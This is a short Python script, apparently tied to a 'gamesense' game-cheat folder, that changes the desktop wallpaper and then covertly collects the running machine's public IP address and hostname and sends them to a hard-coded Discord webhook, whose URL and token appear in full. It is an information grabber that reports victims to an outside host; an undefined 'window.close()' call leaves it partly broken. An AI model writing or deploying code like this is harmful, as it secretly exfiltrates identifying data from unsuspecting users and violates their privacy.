import os
from discord_webhook import DiscordWebhook
import socket
import webbrowser
import requests
import ctypes
from wallpaper import set_wallpaper, get_wallpaper
set_wallpaper("C:\temp\gamesense\wallpaper.png")
def get_ip_address():
    url = 'https://api.ipify.org'
    response = requests.get(url)
    ip_address = response.text
    return ip_address
ip = get_ip_address()
pc = socket.gethostname()




webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1193494516418740345/vwTwT9DLSjlpX1jqMs0rMbIkCtqzrJuuQ-d2QCtnb16vmvD5sQal1cv_rmLwaXm4sOpO", content="Webhook triggered by " + pc + " " + ip)
response = webhook.execute()


window.close()
